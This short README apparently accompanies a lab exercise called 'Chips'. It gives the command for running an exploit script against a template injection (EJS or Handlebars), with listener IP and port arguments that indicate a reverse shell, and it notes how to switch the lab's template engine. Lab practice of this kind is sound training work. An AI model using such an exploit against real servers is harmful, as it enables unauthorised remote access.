# Chips

You can just run the exploit, it will detect the Template engine (EJS/Handlebars)
```bash
python3 exploit.py -t http://chips -l 192.168.45.187 -p 4444 --proxy -wp 8888
# Note --proxy (burp proxy) and --wp (web port) are optional arguments
```
![Chips EJS](/.images/chips_1.png)
![Chips Handlebars](/.images/chips_2.png)

> [!NOTE]
> In order to swap the machine template engine, log in via SSH and run this command:
> ```bash
> # For Handlebars
> docker-compose down; TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-compose.yml up
> 
> # For EJS
> docker-compose down; TEMPLATING_ENGINE=ejs docker-compose -f ~/chips/docker-compose.yml up
> ```